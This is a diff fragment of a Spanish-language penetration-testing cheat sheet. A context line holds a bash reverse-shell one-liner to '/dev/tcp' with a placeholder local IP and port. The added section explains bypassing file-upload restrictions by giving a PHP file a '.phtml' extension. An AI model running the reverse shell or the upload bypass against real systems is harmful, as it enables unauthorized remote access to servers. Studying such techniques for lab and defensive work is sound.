@@ -43,6 +43,14 @@ bash -c "sh -i >&  /dev/tcp/{ip maquina local}/{nuevopuerto} 0>&1"
 ```
 
 
+# Bypass Restriccion de FileUpload (Subir ficheros sin permiso de ficheros para ese formato)
+
+cuando intentas subir un archivo en .php por ejemplo y no está permitido tenemos que Bypassear la restricción.
+
+Intentamnos subir un fichero con extension .phtml
+
+
+
 
 
 
